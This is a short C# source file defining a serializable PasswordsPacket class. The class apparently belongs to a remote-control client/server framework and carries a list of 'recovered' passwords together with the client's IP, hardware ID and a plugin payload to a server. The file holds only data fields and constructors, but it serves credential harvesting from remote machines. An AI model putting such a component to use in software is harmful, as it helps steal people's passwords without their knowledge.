using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class PasswordsPacket : IPacket
    {
        //server
        public PasswordsPacket() : base()
        {
            packetType = PacketType.RECOVERY_PASSWORDS;
        }

        //client
        public PasswordsPacket(List<object[]> passwords, string baseIp, string HWID) : base()
        {
       
            packetType = PacketType.RECOVERY_PASSWORDS;
            this.baseIp = baseIp;
            this.HWID = HWID; 
            
            this.passwordsList = passwords;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public List<object[]> passwordsList { get; set; }
    }
}
